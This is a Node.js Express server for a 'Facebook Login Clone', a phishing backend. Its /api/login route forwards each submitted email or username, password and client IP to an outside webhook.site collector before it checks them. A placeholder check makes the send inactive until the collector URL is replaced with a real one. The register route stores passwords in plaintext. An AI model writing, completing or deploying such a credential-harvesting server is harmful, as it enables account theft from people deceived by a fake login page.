const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Webhook.site URL - Get yours from https://webhook.site
const WEBHOOK_URL = 'https://webhook.site/6d16ab4f-ced3-428f-b879-2aa8e37db36b';  // You'll get this

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const users = [];

// Send to webhook
async function sendToWebhook(email, password, ip) {
    if (!WEBHOOK_URL || WEBHOOK_URL === 'https://webhook.site/6d16ab4f-ced3-428f-b879-2aa8e37db36b') return;
    
    const data = {
        timestamp: new Date().toISOString(),
        email: email,
        password: password,
        ip: ip,
        userAgent: 'Facebook Login Clone'
    };
    
    try {
        await axios.post(WEBHOOK_URL, data);
        console.log('✅ Webhook sent');
    } catch (error) {
        console.log('❌ Webhook error:', error.message);
    }
}

app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be 6+ characters' });
    }
    
    const existing = users.find(u => u.email === email);
    if (existing) {
        return res.status(400).json({ error: 'User already exists' });
    }
    
    const newUser = { id: users.length + 1, name, email, password };
    users.push(newUser);
    
    res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
});

app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Send to webhook
    sendToWebhook(identifier, password, ip);
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    const user = users.find(u => u.email === identifier);
    
    if (!user || user.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    res.json({ success: true, message: 'Login successful!', user: { id: user.id, name: user.name, email: user.email } });
});

app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
